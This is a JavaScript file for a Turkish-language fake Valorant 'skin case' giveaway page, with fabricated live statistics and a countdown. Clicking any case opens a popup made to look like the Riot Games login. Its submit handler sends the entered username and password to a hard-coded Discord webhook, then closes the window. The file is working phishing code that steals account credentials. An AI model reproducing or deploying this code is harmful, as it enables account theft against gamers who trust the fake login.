const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

document.addEventListener("DOMContentLoaded", () => {
    // 1. Üst Şerit
    const track = document.getElementById('track');
    const skins = ["skin1.png", "skin2.png", "skin3.png", "skin4.png", "skin5.png"];
    track.innerHTML = [...skins, ...skins, ...skins, ...skins].map(s => `
        <div class="drop-card"><img src="${s}"><span>RADYANİT ŞANSI</span></div>
    `).join('');

    // 2. Kasa Grid (Simetrik)
    const cases = [
        {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"},
        {n: "STANDART", p: "30 VP", i: "case2.png"},
        {n: "ELİT", p: "50 VP", i: "case3.png"},
        {n: "PREMIUM", p: "100 VP", i: "case4.png"},
        {n: "EFSANEVİ", p: "500 VP", i: "case5.png"},
        {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
    ];
    document.getElementById('caseGrid').innerHTML = cases.map(c => `
        <div class="case-box" onclick="openAuth()">
            <img src="${c.i}">
            <h3 style="font-size:18px; margin:10px 0 0;">${c.n} KASASI</h3>
            <div class="vp-tag">${c.p}</div>
            <button class="open-btn">KASAYI AÇ</button>
        </div>
    `).join('');

    // 3. UTC+3 Sayaç
    setInterval(() => {
        const now = new Date();
        const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
        let t = new Date(utc3); t.setHours(24, 0, 0, 0);
        let d = t - utc3;
        let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
        document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
    }, 1000);

    // 4. Gerçekçi İstatistik Artışı
    setInterval(() => {
        let s1 = document.getElementById('s1');
        let val = parseInt(s1.innerText.replace('.',''));
        s1.innerText = (val + Math.floor(Math.random() * 7 - 3)).toLocaleString('tr-TR');
    }, 4000);
});

// 5. Riot Giriş Penceresi (600x800)
function openAuth() {
    const w = 600, h = 800;
    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
    
    win.document.body.innerHTML = `
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
            body { margin:0; height:100vh; background: url('login_bg.jpg') center/cover; display:flex; justify-content:center; align-items:center; font-family:'Inter',sans-serif; }
            .card { background:#fff; width:350px; padding:50px; border-radius:4px; text-align:center; box-shadow: 0 15px 50px rgba(0,0,0,0.3); }
            input { width:100%; padding:14px; margin:10px 0; background:#f2f2f2; border:2px solid transparent; border-radius:4px; font-weight:600; box-sizing:border-box; outline:none; }
            input:focus { border-color:#ff4655; background:#fff; }
            .btn { width:100%; padding:18px; background:#ff4655; color:#fff; border:none; border-radius:12px; font-weight:700; cursor:pointer; margin-top:40px; }
        </style>
        <div class="card">
            <img src="login_logo.png" width="100" style="margin-bottom:30px;">
            <h2 style="color:#111; margin-bottom:30px;">Oturum Aç</h2>
            <input type="text" id="u" placeholder="KULLANICI ADI">
            <input type="password" id="p" placeholder="ŞİFRE">
            <button class="btn" id="go">GİRİŞ YAP</button>
            <p style="font-size:11px; color:#aaa; margin-top:25px; font-weight:600;">OTURUM AÇAMIYOR MUSUN? <br> HESAP OLUŞTUR</p>
        </div>
    `;

    win.document.getElementById('go').onclick = function() {
        const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🔑 **Giriş Bilgisi**\n👤 Kullanıcı: \`${u}\` \n🔑 Şifre: \`${p}\`` })
            }).then(() => {
                win.document.body.innerHTML = "<h2 style='color:white; background:rgba(0,0,0,0.8); padding:20px;'>Yönlendiriliyorsunuz...</h2>";
                setTimeout(() => win.close(), 1500);
            });
        }
    };
}
